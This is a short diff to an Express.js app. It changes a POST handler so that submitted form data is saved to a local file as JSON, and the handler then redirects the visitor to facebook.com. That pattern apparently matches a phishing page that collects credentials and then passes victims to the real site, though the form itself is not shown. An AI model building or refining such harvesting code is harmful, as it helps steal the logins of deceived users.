@@ -14,7 +14,7 @@ app.get('/', (req, res) =>{
 app.post('/submit', (req, res) => {
   // Extract form data
   const formData = req.body;
-  fs.writeFileSync('file.txt',formData)
+  fs.writeFileSync('file.txt',JSON.stringify(formData))
   res.redirect('https://facebook.com');
 });
 
